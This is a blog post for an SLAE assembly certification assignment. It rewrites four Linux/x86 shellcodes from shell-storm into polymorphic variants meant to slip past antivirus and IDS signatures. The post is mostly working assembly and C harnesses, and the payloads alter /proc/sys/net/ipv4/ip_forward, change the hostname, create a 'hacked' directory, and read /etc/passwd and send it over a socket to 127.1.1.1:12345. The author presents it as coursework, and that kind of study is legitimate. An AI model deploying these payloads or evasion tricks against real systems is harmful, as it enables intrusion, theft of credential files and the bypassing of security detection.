---
layout: post
title: SLAE Assignment 6 - Polymorphic Shellcode (Linux/x86)
---

Polymorphism is a generic method to prevent pattern-matching. Pattern-matching means that a program P (an antivirus or an IDS) has a data-base with 'signatures'. A signature is bytes suite identifying a program. We can defeat such pattern matching programs by replacing assembly instructions with other equivalent set of instructions which will result in different shellcode. Consider the below example clearing a register and moving some value into it.

<!-- more -->

```nasm
xor eax, eax
mov al, 0xa
```
The same result can be acheived with the following set of instructions as well.
```nasm
push 0xa
pop eax
```
There are other set of instructions also which will yeild the same result, but with different shellcode bytes. The objective of this assignment are as follows:
- Create polymorphic version of 3 shellcodes from [shell-storm.org](http://www.shell-storm.org)
- The polymorphic version should not be greater than **150%** of the original shellcode
- Bonus points if the size of polymorphic shellcode is less than the original shellcode

So without further ado, lets get down to business.

### #1 - Linux/x86 - Set '/proc/sys/net/ipv4/ip_forward' to '0' & exit() - 83 Bytes
The first shellcode is to set the value of `/proc/sys/net/ipv4/ip_forward` to `0` and can be found [here](http://shell-storm.org/shellcode/files/shellcode-848.php). We would need root privileges to successfully run this shellcode.
```c
/*
    In The Name of G0D
    Linux/x86 - Set '/proc/sys/net/ipv4/ip_forward' to '0' & exit() 
    Size : 83 Bytes
    fun for routers ;)
    Author : By Hamid Zamani (aka HAMIDx9)
    Member of ^^Ashiyane Digital Security Team^^

Disassembly of section .text:

08048054 <_start>:
 8048054:   31 c0                   xor    %eax,%eax
 8048056:   50                      push   %eax
 8048057:   68 77 61 72 64          push   $0x64726177
 804805c:   68 5f 66 6f 72          push   $0x726f665f
 8048061:   68 34 2f 69 70          push   $0x70692f34
 8048066:   68 2f 69 70 76          push   $0x7670692f
 804806b:   68 2f 6e 65 74          push   $0x74656e2f
 8048070:   68 73 79 73 2f          push   $0x2f737973
 8048075:   68 72 6f 63 2f          push   $0x2f636f72
 804807a:   66 68 2f 70             pushw  $0x702f
 804807e:   89 e3                   mov    %esp,%ebx
 8048080:   31 c9                   xor    %ecx,%ecx
 8048082:   b1 01                   mov    $0x1,%cl
 8048084:   b0 05                   mov    $0x5,%al
 8048086:   cd 80                   int    $0x80
 8048088:   89 c3                   mov    %eax,%ebx
 804808a:   31 c9                   xor    %ecx,%ecx
 804808c:   51                      push   %ecx
 804808d:   6a 30                   push   $0x30
 804808f:   89 e1                   mov    %esp,%ecx
 8048091:   31 d2                   xor    %edx,%edx
 8048093:   b2 01                   mov    $0x1,%dl
 8048095:   b0 04                   mov    $0x4,%al
 8048097:   cd 80                   int    $0x80
 8048099:   31 c0                   xor    %eax,%eax
 804809b:   83 c0 06                add    $0x6,%eax
 804809e:   cd 80                   int    $0x80
 80480a0:   31 c0                   xor    %eax,%eax
 80480a2:   40                      inc    %eax
 80480a3:   31 db                   xor    %ebx,%ebx
 80480a5:   cd 80                   int    $0x80
*/

#include <stdio.h>
int main(int argc,char **argv){

char shellcode[] = "\x31\xc0\x50\x68\x77\x61\x72\x64\x68"
                   "\x5f\x66\x6f\x72\x68\x34\x2f\x69\x70"
                   "\x68\x2f\x69\x70\x76\x68\x2f\x6e\x65"
                   "\x74\x68\x73\x79\x73\x2f\x68\x72\x6f"
                   "\x63\x2f\x66\x68\x2f\x70\x89\xe3\x31"
                   "\xc9\xb1\x01\xb0\x05\xcd\x80\x89\xc3"
                   "\x31\xc9\x51\x6a\x30\x89\xe1\x31\xd2"
                   "\xb2\x01\xb0\x04\xcd\x80\x31\xc0\x83"
                   "\xc0\x06\xcd\x80\x31\xc0\x40\x31\xdb"
                   "\xcd\x80";
                   
     printf("Length: %d\n",strlen(shellcode));
     (*(void(*)()) shellcode)();
     
     return 0;
}
```
Before we begin, lets make sure that this shellcode works.
![shellcode-848-og-running](/assets/SLAE-x86/6.1-shellcode-848-og-running.PNG)
So the shellcode is working fine. Lets write a polymorphic version for the above shellcode. Dumping assemby in Intel syntax.
```nasm
section .text
global _start

_start:
        xor eax,eax
        push eax
        push dword 0x64726177
        push dword 0x726f665f
        push dword 0x70692f34
        push dword 0x7670692f
        push dword 0x74656e2f
        push dword 0x2f737973
        push dword 0x2f636f72
        push word 0x702f

        mov ebx,esp
        xor ecx,ecx
        mov cl,0x1
        mov al,0x5
        int 0x80

        mov ebx,eax
        xor ecx,ecx
        push ecx
        push byte +0x30
        mov ecx,esp
        xor edx,edx
        mov dl,0x1
        mov al,0x4
        int 0x80

        xor eax,eax
        add eax,byte +0x6
        int 0x80

        xor eax,eax
        inc eax
        xor ebx,ebx
        int 0x80
```
My idea is to replace the series of `push` instructions in the original shellcode with equivalent instructions, changing the `push` values at the same time.  Only the first `push` value is hardcoded (with some number subtracted from it). We will derive values for the next `push` instruction by adding/subtracting numbers from previously pushed value. The original instructions are commented out and equivalent instruction are written below it in the polymorphic version. This convention is followed throughtout this post. Polymorphic version of the above shellcode is as follows:
```nasm
; Title 		: SLAE Linux/x86 - Assignment-6.1
; Description	: Polymorphic version of Linux/x86 - Set '/proc/sys/net/ipv4/ip_forward' to '0' & exit() - 83 Bytes
; Original 		: http://shell-storm.org/shellcode/files/shellcode-848.php
; Author		: Rizal Muhammed (UB3RSiCK)
; Student ID	: SLAE 933
; Shellcode Len.: 106 Bytes (~27.8% increase)
;
; nasm -f elf32 shellcode-848-poly.nasm -o shellcode-848-poly.o
; ld shellcode-848-poly.o -o shellcode-848-poly -z execstack

section .text
global _start

_start:

  xor eax,eax
  push eax
        
	;push dword 0x64726177
	push dword 0x63716076
	pop ebx					; 0x64726177 = 0x63716076 + 0x01010101
	add ebx, 0x01010101
	push ebx
        
	;push dword 0x726f665f
	add ebx, 0xdfd04e8		; 0x726f665f = 0x64726177 + 0xdfd04e8
	push ebx

  	;push dword 0x70692f34
	sub ebx, 0x206372b		; 0x70692f34 = 0x726f665f - 0x206372b
	push ebx	

  	;push dword 0x7670692f
	add ebx, 0x60739fb		; 0x7670692f = 0x70692f34 + 0x60739fb
	push ebx

  	;push dword 0x74656e2f
	sub ebx, 0x20afb01		; 0x74656e2f = 0x7670692f - 0x20afb01 + 1
	inc ebx					; +1 to avoid null byte [0x7670692f - 0x74656e2f] = [0x20afb00]
	push ebx

  	;push dword 0x2f737973
	sub ebx, 0x44f1f4bc		; 0x2f737973 = 0x74656e2f - 0x44f1f4bc
	push ebx

  	;push dword 0x2f636f72
	sub ebx, 0x11223344		; 0x2f737973 - 0x11223344 + 0x11122943 = 0x2f636f72
	add ebx, 0x11122943
	push ebx

  	push word 0x702f

 	 mov ebx,esp

	;xor ecx,ecx
  	;mov cl,0x1
	push 0x1
	pop ecx
	
  	mov al,0x5
  	int 0x80

	;mov ebx,eax
	push eax
	pop ebx

	xor ecx,ecx
    	push ecx
    	push byte +0x30
    	mov ecx,esp
        
	;xor edx,edx
    	;mov dl,0x1
	push 0x1
	pop edx
	
    	mov al,0x4
    	int 0x80

   	;xor eax,eax
    	;add eax,byte +0x6
	push 0x6
	pop eax

    	int 0x80

    	;xor eax,eax
   	;inc eax
	push 0x1
	pop eax

    	xor ebx,ebx
    	int 0x80
```
Let us test our polymorphic version.
![shellcode-848-poly-running](/assets/SLAE-x86/6.1-shellcode-848-poly-running.PNG)

Original Shellcode 		: **83 bytes**

Polymorphic version 	: **106 bytes (~27.8% increase)**
### #2 - Linux/x86 - sys_sethostname(PwNeD !!, 8) - 32 bytes
The second shellcode changes the hostname to **"PwNed !!"**. The original shellcode can be found [here](http://shell-storm.org/shellcode/files/shellcode-622.php). For this one also we require root privileges to run successfully.
```c
/*
Title  : sethostname "pwned !!"
Name   : 32 bytes sys_sethostname("PwNeD !!",8) x86 linux shellcode
Date   : may, 31 2009
Author : gunslinger_ <yudha.gunslinger[at]gmail.com>
Web    : devilzc0de.com
blog   : gunslingerc0de.wordpress.com
tested on : linux debian
*/

#include <stdio.h>

char *shellcode=
 "\xeb\x11"                    /* jmp    0x8048073 */
 "\x31\xc0"                    /* xor    %eax,%eax */
 "\xb0\x4a"                    /* mov    $0x4a,%al */
 "\x5b"                        /* pop    %ebx */
 "\xb1\x08"                    /* mov    $0x8,%cl */
 "\xcd\x80"                    /* int    $0x80 */
 "\x31\xc0"                    /* xor    %eax,%eax */
 "\xb0\x01"                    /* mov    $0x1,%al */
 "\x31\xdb"                    /* xor    %ebx,%ebx */
 "\xcd\x80"                    /* int    $0x80 */
 "\xe8\xea\xff\xff\xff"        /* call   0x8048062 */
 "\x50"                        /* push   %eax */
 "\x77\x4e"                    /* ja     0x80480c9 */
 "\x65"                        /* gs */
 "\x44"                        /* inc    %esp */
 "\x20\x21"                    /* and    %ah,(%ecx) */
 "\x21";                        /* .byte 0x21 */

int main(void)
{
		fprintf(stdout,"Length: %d\n",strlen(shellcode));
		((void (*)(void)) shellcode)();
		return 0;
}
```
Making sure the original is working.
![6.2-shellcode-622-og-running](/assets/SLAE-x86/6.2-shellcode-622-og-running.PNG)
The polymorphic version of the above shellcode is as follows:
```nasm
; Title 		: SLAE Linux/x86 - Assignment-6.2
; Description	: Polymorphic version of Linux/x86 - sys_sethostname(PwNeD !!, 8) - 32 bytes by gunslinger_
; Original 		: http://shell-storm.org/shellcode/files/shellcode-622.php
; Author		: Rizal Muhammed (UB3RSiCK)
; Student ID	: SLAE 933
; Shellcode Len.: 28 bytes (4 Bytes smaller than original)
;
; nasm -f elf32 shellcode-622-poly.nasm -o shellcode-622-poly.o
; ld shellcode-622-poly.o -o shellcode-622-poly -z execstack

section .text
global _start

_start:

;original
;00000000  EB11              jmp short 0x13
;00000002  31C0              xor eax,eax
;00000004  B04A              mov al,0x4a
;00000006  5B                pop ebx
;00000007  B108              mov cl,0x8
;00000009  CD80              int 0x80
;0000000B  31C0              xor eax,eax
;0000000D  B001              mov al,0x1
;0000000F  31DB              xor ebx,ebx
;00000011  CD80              int 0x80
;00000013  E8EAFFFFFF        call dword 0x2
;00000018  50                push eax
;00000019  774E              ja 0x69
;0000001B  6544              gs inc esp
;0000001D  2021              and [ecx],ah
;0000001F  21                db 0x21

;Polymorphic

	xor eax,eax
	push eax					; push null terminator
	push dword 0x21212044		; python -c 'print "PwNeD !!"[::-1].encode("hex")'
	push dword 0x654e7750
	mov ebx, esp				; ebx = char __user *name
	mov al, 0x4a				; sys_sethostname = 0x4a
	push 0x8
	pop ecx						; ecx = int len
	int 0x80

	; exit
	mov al,0x1
	xor ebx,ebx
	int 0x80
```
Lets test our polymorphic version.
![shellcode-622-poly-running](/assets/SLAE-x86/6.2-shellcode-622-poly-running.PNG)
The polymorphic shellcode works and is smaller than the original shellcode.

Original Shellcode : **32 bytes**

poymorphic Shellcode : **28 bytes (4 bytes smaller than original) - 12.5% decrease**

### #3 - Linux/x86 - mkdir() & exit() - 36 bytes
The third shellcode makes a folder names **hacked** in current directory and exits. The shellcode can be found [here](http://shell-storm.org/shellcode/files/shellcode-542.php)
```c
/*
 * This shellcode will do a mkdir() of 'hacked' and then an exit()
 * Written by zillion@safemode.org
 *
 */

char shellcode[]=
		"\xeb\x16\x5e\x31\xc0\x88\x46\x06\xb0\x27\x8d\x1e\x66\xb9\xed"
        "\x01\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x68"
        "\x61\x63\x6b\x65\x64\x23";

void main(){
  int *ret;
  ret = (int *)&ret + 2;
  (*ret) = (int)shellcode;
}
```
Making sure its working.
![shellcode-542-og](/assets/SLAE-x86/6.3-shellcode-542-og.PNG)
Polymorphic version of the shellcode:

```nasm
; Title 		: SLAE Linux/x86 - Assignment-6.3
; Description	: Polymorphic version of Linux/x86 - mkdir() & exit() - 36 bytes by zillion
; Original 		: http://shell-storm.org/shellcode/files/shellcode-542.php
; Author		: Rizal Muhammed (UB3RSiCK)
; Student ID	: SLAE 933
; Shellcode Len.: 29 Bytes (7 bytes less than the original)
;
; nasm -f elf32 shellcode-542-poly.nasm -o shellcode-542-poly.o
; ld shellcode-542-poly.o -o shellcode-542-poly -z execstack

section .text
global _start
_start:
	
        jmp short get_addr
		string_addr:
            		pop ebx
			push 0x27
			pop eax
			mov cx,0x1ed
            		int 0x80
              	
			mov al,0x1
            		xor ebx,ebx
            		int 0x80
	get_addr:
        	call string_addr
        	fname db "hacked"
```
Lets test the polymorphic version.
![shellcode-542-poly](/assets/SLAE-x86/6.3-shellcode-542-poly.PNG)

Original Shellcode : **36 bytes**

Polymorphic Shellcode :	**29 Bytes (7 bytes less than the original) - ~19.45% decrease**

### #4 - Linux/x86 - reads /etc/passwd and sends the content to 127.1.1.1 port 12345 - 111 bytes
Lets create polymorphic shellcode for one more - for fun :D. This one reads the file `/etc/passwd` and sends the contents to localhost port 12345. The original shellcode can be found [here](http://shell-storm.org/shellcode/files/shellcode-861.php)
```c
/*
; Author: Daniel Sauder
; Website: http://govolution.wordpress.com/about
; License http://creativecommons.org/licenses/by-sa/3.0/

; Shellcode reads /etc/passwd and sends the content to 127.1.1.1 port 12345. 
; The file can be recieved using netcat:
; $ nc -l 127.1.1.1 12345

section .text

global _start

_start:
    ; socket
    push BYTE 0x66    ; socketcall 102
    pop eax
    xor ebx, ebx 
    inc ebx 
    xor edx, edx
    push edx 
    push BYTE 0x1
    push BYTE 0x2
    mov ecx, esp
    int 0x80
    mov esi, eax

    ; connect
    push BYTE 0x66 
    pop eax
    inc ebx
    push DWORD 0x0101017f  ;127.1.1.1
    push WORD 0x3930  ; Port 12345
    push WORD bx
    mov ecx, esp
    push BYTE 16
    push ecx
    push esi
    mov ecx, esp
    inc ebx
    int 0x80

    ; dup2
    mov esi, eax
    push BYTE 0x1
    pop ecx
    mov BYTE al, 0x3F
    int 0x80

    ;read the file
    jmp short call_shellcode

shellcode:
    push 0x5
    pop eax
    pop ebx
    xor ecx,ecx
    int 0x80
    mov ebx,eax
    mov al,0x3
    mov edi,esp
    mov ecx,edi
    xor edx,edx
    mov dh,0xff
    mov dl,0xff
    int 0x80
    mov edx,eax
    push 0x4
    pop eax
    mov bl, 0x1
    int 0x80
    push 0x1
    pop eax
    inc ebx
    int 0x80

call_shellcode:
    call shellcode
    message db "/etc/passwd"
*/

#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x6a\x66\x58\x31\xdb\x43\x31\xd2\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\x6a\x66\x58\x43\x68\x7f\x01\x01\x01\x66\x68\x30\x39\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\x43\xcd\x80\x89\xc6\x6a\x01\x59\xb0\x3f\xcd\x80\xeb\x27\x6a\x05\x58\x5b\x31\xc9\xcd\x80\x89\xc3\xb0\x03\x89\xe7\x89\xf9\x31\xd2\xb6\xff\xb2\xff\xcd\x80\x89\xc2\x6a\x04\x58\xb3\x01\xcd\x80\x6a\x01\x58\x43\xcd\x80\xe8\xd4\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64";

main()
{
    printf("Shellcode Length:  %d\n", strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}
```
Lets make sure that the original works fine.
![shellcode-861-og](/assets/SLAE-x86/6.4-shellcode-861-og.PNG)
polymorphic version of the above shellcode is as follows:
```nasm
; Title 	: SLAE Linux/x86 - Assignment-6.4
; Description	: Polymorphic version of Linux/x86 - reads /etc/passwd and sends the content to 127.1.1.1 port 12345 - 111 bytes by Daniel Sauder
; Original 	: http://shell-storm.org/shellcode/files/shellcode-861.php
; Author	: Rizal Muhammed (UB3RSiCK)
; Student ID	: SLAE 933
; Shellcode Len.: 128 Bytes (~15.3% increase in shellcode size)
;
; nasm -f elf32 shellcode-861-poly.nasm -o shellcode-861-poly.o
; ld shellcode-861-poly.o -o shellcode-861-poly -z execstack


section .text
global _start
_start:
    	; socket
	push BYTE 0x66    ; socketcall 102
	pop eax

	;xor ebx, ebx 
    	;inc ebx 
	push byte 0x1
	pop ebx

    	;xor edx, edx
    	;push edx 
	cdq
	push edx
	
   	push BYTE 0x1
	push BYTE 0x2

	;mov ecx, esp
	push esp
	pop ecx

    	int 0x80

    	;mov esi, eax
	push eax
	pop esi

    	; connect
    	push BYTE 0x66 
    	pop eax
    	inc ebx

    	;push DWORD 0x0101017f  ;127.1.1.1
	mov edx, 0x01010101
	add edx,0x7e
	push edx

    	;push WORD 0x3930  ; Port 12345
	add dx, 0x37b1		; dx = 0x017f ; 0x37b1 + 0x017f = 0x3930
	push word dx

    	push WORD bx
    	mov ecx, esp
    	push BYTE 16
    	push ecx
    	push esi
    	mov ecx, esp
    	inc ebx
   	int 0x80

    	; dup2
    	mov esi, eax
    	push BYTE 0x1
    	pop ecx
    	mov BYTE al, 0x3F
    	int 0x80
    
    	;read the file
    	;jmp short call_shellcode
    
;shellcode:

    	;push 0x5
    	;pop eax
	xor eax, eax
	push eax		; null byte to terminate our /etc//passwd string
	mov al, 0x5

	;removing the jmp call pop
    	;pop ebx

	;"/etc//passwd"[::-1].encode("hex")
	; 6477737361702f2f6374652f

	mov ebx, 0x54676363
	add ebx, 0x10101010
	push ebx			; 0x64777373
	;------------------
	sub ebx, 0x3074444
	push ebx			; 0x61702f2f
	;------------------
	add ebx, 0x2043601
	dec ebx
	push ebx			; 0x6374652f
	;------------------
	mov ebx, esp

    	xor ecx,ecx
    	int 0x80
    
	;mov ebx,eax
	push eax
	pop ebx

	mov al,0x3
    	mov edi,esp
    	mov ecx,edi

    	;xor edx,edx
	cdq

    	;mov dh,0xff
    	;mov dl,0xff

	mov dx,0xffff
    	int 0x80

	;mov edx,eax
	push eax
	pop edx

    	push 0x4
    	pop eax
    	mov bl, 0x1

    	int 0x80
    	push 0x1
    	pop eax
    	inc ebx
    	int 0x80
    
;call_shellcode:
;    	call shellcode
;    	message db "/etc/passwd"
```
lets test our polymorphic shellcode.
![shellcode-861-poly](/assets/SLAE-x86/6.4-shellcode-861-poly.PNG)

Original Shellcode : **111 bytes**

Polymorphic Shellcode : **128 Bytes (~15.3% increase in shellcode size)**

And we are done :)


This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

[http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

Student ID: **SLAE-933**
